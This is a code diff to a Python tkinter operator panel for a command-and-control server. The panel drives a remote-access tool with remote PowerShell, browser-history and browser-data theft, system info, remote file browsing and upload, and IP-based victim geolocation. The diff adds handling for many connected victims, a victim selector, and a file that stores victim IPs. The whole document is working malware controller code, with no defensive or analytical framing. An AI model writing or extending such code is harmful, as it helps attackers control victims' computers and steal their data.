@@ -3,6 +3,7 @@ from tkinter import ttk, scrolledtext, filedialog, messagebox, simpledialog
 import threading
 import io
 import csv
+import time
 from pathlib import Path
 from PIL import Image, ImageTk
 import sv_ttk
@@ -18,7 +19,7 @@ except ImportError as e:
     WRAPPER_LOADED = False
 
 C2_PORT = 3000  # Default port
-
+CONNECTIONS_FILE = Path(__file__).parent / 'connections.txt'
 
 class DirectoryBrowser:
     """Directory browser window for navigating remote file system"""
@@ -315,7 +316,6 @@ class DirectoryBrowser:
         except Exception as e:
             messagebox.showerror("Upload Failed", f"Failed to upload file:\n{e}")
 
-
 class C2ServerGUI:
     def __init__(self, root):
         self.root = root
@@ -324,7 +324,6 @@ class C2ServerGUI:
         
         self.c2 = None
         self.connected = False
-        self.client_info = None
         
         if not WRAPPER_LOADED:
             messagebox.showerror(
@@ -389,6 +388,13 @@ class C2ServerGUI:
             width=20
         )
         self.stop_btn.pack(side=tk.LEFT, padx=5)
+
+        # Client selector
+        self.client_combo = ttk.Combobox(btn_container, values=[], width=30, state='readonly')
+        self.client_combo.pack(side=tk.LEFT, padx=(10,5))
+
+        ttk.Button(btn_container, text="Select", command=self.select_client, width=5).pack(side=tk.LEFT, padx=5)
+        ttk.Button(btn_container, text="Refresh", command=self.refresh_clients, width=5).pack(side=tk.LEFT, padx=5)
         
         # Command buttons frame with 2x2 grid
         cmd_frame = ttk.LabelFrame(main_container, text="Available Commands", padding=15)
@@ -492,7 +498,13 @@ class C2ServerGUI:
         self.log_text.tag_config("error", foreground="#FF6B6B")
 
     def show_victim_location(self):
-        victim_ip = self.c2.ipv4.strip()
+        # get public ip
+        victim_ip = None
+        res = self.c2.get_client_info()
+        for line in res.splitlines():
+            if line.startswith("Public IP"):
+                victim_ip = line.split(":", 1)[1].strip()
+        
 
         # Create loading window
         loading_win = tk.Toplevel(self.root)
@@ -568,7 +580,7 @@ class C2ServerGUI:
 
     def show_system_info(self):
         try:
-            info = self.client_info
+            info = self.c2.get_client_info()
             
             if info:
                 self.log("System info retrieved", "success")
@@ -744,24 +756,61 @@ class C2ServerGUI:
             self.status_label.config(text="Waiting for connection...", foreground="orange")
             self.root.update()
             
+            # start listening in background
             self.c2.setup()
-            self.connected = True
-            
-            self.log("Victim connected", "success")
-            
-            try:
-                client_info = self.c2.get_client_info()
-                if client_info:
-                    self.log(client_info, "info")
-                    first_line = client_info.split('\n')[0][:70]
-                    self.client_info_label.config(text=first_line)
-                    self.client_info = client_info
-            except:
-                pass
-            
-            self.status_label.config(text="Connected", foreground="green")
-            self._enable_commands()
             self.stop_btn.config(state=tk.NORMAL)
+
+            # start background thread to accept incoming clients
+            # clients: ip -> {'fd': int or None, 'online': bool}
+            self.clients = {}
+
+            try:
+                if CONNECTIONS_FILE.exists():
+                    with open(CONNECTIONS_FILE, 'r') as f:
+                        for line in f:
+                            ip = line.strip()
+                            if not ip:
+                                continue
+                            # store entries with no fd and offline by default
+                            self.clients[ip] = {'fd': None, 'online': False}
+
+                # populate combobox with ip (offline) labels
+                vals = [f"{ip} ({'online' if info.get('online') else 'offline'})" for ip, info in self.clients.items()]
+                if vals:
+                    self.client_combo['values'] = vals
+                    self.client_combo.set('')
+            except Exception:
+                pass
+
+            def accept_loop():
+                while True:
+                    try:
+                        fd = self.c2.accept_client()
+                        if fd and fd > 0:
+                            ip = self.c2.get_peer_ip(fd)
+
+                            # update GUI from main thread
+                            def add_cb(ip=ip, fd=fd):
+                                # update mapping: set fd and mark online
+                                existing = self.clients.get(ip, {})
+                                existing['fd'] = fd
+                                existing['online'] = True
+                                self.clients[ip] = existing
+
+                                # rebuild combobox labels
+                                vals = [f"{i} ({'online' if inf.get('online') else 'offline'})" for i, inf in self.clients.items()]
+                                self.client_combo['values'] = vals
+                                self._persist_connections()
+                                self.log(f"Client connected: {ip}", "success")
+
+                            self.root.after(0, add_cb)
+                    except Exception:
+                        # small delay to avoid busy loop if error occurs
+                        time.sleep(0.5)
+
+            threading.Thread(target=accept_loop, daemon=True).start()
+
+            self.log("Server started (listening). Waiting for clients...", "info")
             
         except Exception as e:
             self.log(f"Server error: {e}", "error")
@@ -779,8 +828,7 @@ class C2ServerGUI:
         self.browser_history_btn.config(state=tk.NORMAL)
         self.browser_dl_btn.config(state=tk.NORMAL)
         self.system_info_btn.config(state=tk.NORMAL)
-        
-        
+             
     def _disable_commands(self):
         """Disable all command buttons"""
         self.psh_btn.config(state=tk.DISABLED)
@@ -792,11 +840,24 @@ class C2ServerGUI:
         self.browser_history_btn.config(state=tk.DISABLED)
         self.browser_dl_btn.config(state=tk.DISABLED)
         self.system_info_btn.config(state=tk.DISABLED)
-        
-        
+              
     def stop_server(self):
-        self.c2.cleanup()
+        try:
+            self.c2.stop_listen()
+        except Exception:
+            pass
         self.log("Server stopped")
+        # close all accepted clients
+        try:
+            for ip, info in getattr(self, 'clients', {}).items():
+                try:
+                    fd = info.get('fd') if isinstance(info, dict) else info
+                    if fd:
+                        self.c2.close_client(fd)
+                except Exception:
+                    pass
+        except Exception:
+            pass
         self.c2 = None
                 
         self.connected = False
@@ -805,6 +866,94 @@ class C2ServerGUI:
         self.start_btn.config(state=tk.NORMAL)
         self.stop_btn.config(state=tk.DISABLED)
         self._disable_commands()
+        self.client_combo['values'] = []
+        self.client_combo.set('')
+
+    def select_client(self):
+        sel = self.client_combo.get()
+        if not sel:
+            messagebox.showerror("Error", "No client selected")
+            return
+        # sel format: 'ip (status)'
+        ip = sel.split(' ')[0]
+        info = self.clients.get(ip)
+        if not info:
+            messagebox.showerror("Error", "Selected client not found")
+            return
+
+        fd = info.get('fd')
+        if not fd:
+            messagebox.showerror("Error", "Selected client is offline")
+            return
+
+        # assign client fd to wrapper so existing methods work
+        self.c2.client_fd = fd
+
+        # fetch client info and enable commands
+        try:
+            client_info = self.c2.get_client_info()
+            if client_info:
+                self.log(client_info, "info")
+                first_line = client_info.split('\n')[0][:70]
+                self.client_info_label.config(text=first_line)
+                self.client_info = client_info
+        except Exception:
+            pass
+
+        self.connected = True
+        self.status_label.config(text=f"Connected ({ip})", foreground="green")
+        self._enable_commands()
+
+    def _persist_connections(self):
+        try:
+            # persist only IPs (one per line). Online state and fds are runtime-only.
+            with open(CONNECTIONS_FILE, 'w') as f:
+                for ip in self.clients.keys():
+                    f.write(f"{ip}\n")
+        except Exception:
+            pass
+
+    def refresh_clients(self):
+        """Refresh client online/offline status and update UI/persistence."""
+        try:
+            vals = []
+            # Save current selected wrapper client_fd and restore later
+            prev_fd = getattr(self.c2, 'client_fd', None)
+
+            for ip, info in list(self.clients.items()):
+                fd = info.get('fd')
+                online = False
+
+                # If we have an fd for this ip, try to request system info to verify online
+                if fd:
+                    try:
+                        # Temporarily set client_fd for the check and call get_client_info
+                        self.c2.client_fd = fd
+                        res = self.c2.get_client_info()
+                        if res and res.strip():
+                            online = True
+                    except Exception:
+                        online = False
+
+                # If we failed to verify the client, clear stored fd to avoid stale fds
+                if not online and fd:
+                    self.clients[ip]['fd'] = None
+
+                self.clients[ip]['online'] = online
+                vals.append(f"{ip} ({'online' if online else 'offline'})")
+
+            # restore previous client fd
+            try:
+                self.c2.client_fd = prev_fd
+            except Exception:
+                pass
+            cur = self.client_combo.get()
+            self.client_combo['values'] = vals
+            if cur in vals:
+                self.client_combo.set(cur)
+            self._persist_connections()
+        except Exception:
+            pass
         
     def start_powershell(self):
         # Open an internal non-blocking shell window that sends commands via psh_command
@@ -973,12 +1122,8 @@ def main():
     app = C2ServerGUI(root)
     
     def on_closing():
-        if app.connected:
-            if messagebox.askokcancel("Quit", "Active connection will be closed. Continue?"):
-                app.stop_server()
-                root.destroy()
-        else:
-            root.destroy()
+        app.stop_server()
+        root.destroy()
     
     root.protocol("WM_DELETE_WINDOW", on_closing)
     root.mainloop()
